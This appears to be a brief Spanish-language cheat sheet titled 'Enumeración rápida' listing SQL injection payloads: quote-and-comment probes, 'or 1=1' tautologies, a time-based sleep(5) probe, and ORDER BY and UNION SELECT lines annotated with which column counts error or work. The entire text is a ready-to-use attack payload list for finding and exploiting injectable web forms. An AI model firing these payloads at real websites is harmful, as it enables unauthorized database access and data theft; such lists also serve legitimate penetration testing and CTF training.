
Enumeración rápida
```
a' -- -
a' or 1=1-- -
a' or '1'='1
a' or sleep(5)-- -

a' order by 500-- - (error)
a' order by 2-- - (funciona)
a' order by 5-- - (funciona)

a' union select 1,2,3-- - (error)
a' union select 1,2,3,4,5,6,7-- - (funciona)
a' union select 1,2,3,4,5,6,7,8,9-- - (error)
```